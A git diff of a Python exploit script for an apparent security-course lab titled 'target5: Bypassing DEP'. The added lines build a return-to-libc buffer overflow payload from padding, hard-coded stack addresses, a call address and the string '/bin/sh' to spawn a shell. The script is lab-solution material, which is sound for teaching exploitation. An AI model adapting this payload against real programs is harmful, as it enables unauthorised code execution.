@@ -1,5 +1,3 @@
-#!/user/bin/env python3
-
 # target5: Bypassing DEP
 # (Difficulty: Medium)
 # This program resembles target2, but it has been compiled with data execution prevention (DEP)
@@ -15,17 +13,12 @@ import sys
 from shellcode import shellcode
 from struct import pack
 
-#print(pack("<I", 0x080518d0))
-#print(pack("<I", 0xfffee880))
-#print(pack("<I", 0x785c3064))
-
-# 0xfffee870 <---- start of buffer address
-# 0xfffee880
-
-padding = 22
-for i in range(padding):
-  sys.stdout.buffer.write(b"\x90")
-sys.stdout.buffer.write(pack("<I", 0x080518d0)) ## start of system call
-sys.stdout.buffer.write(pack("<I", 0xfffee880))
-sys.stdout.buffer.write(pack("<I", 0x785c3064))
+sys.stdout.buffer.write(bytes.fromhex('41' * 10))
+sys.stdout.buffer.write(pack("<I", 0xfffee890))
+sys.stdout.buffer.write(bytes.fromhex('41' * 4))
+sys.stdout.buffer.write(pack("<I",0xfffee898))
+sys.stdout.buffer.write(pack("<I", 0x08049d16))
+sys.stdout.buffer.write(pack("<I", 0xfffee8a0))
+sys.stdout.buffer.write(bytes.fromhex('41'*12))
+sys.stdout.buffer.write(b"/bin/sh")
 
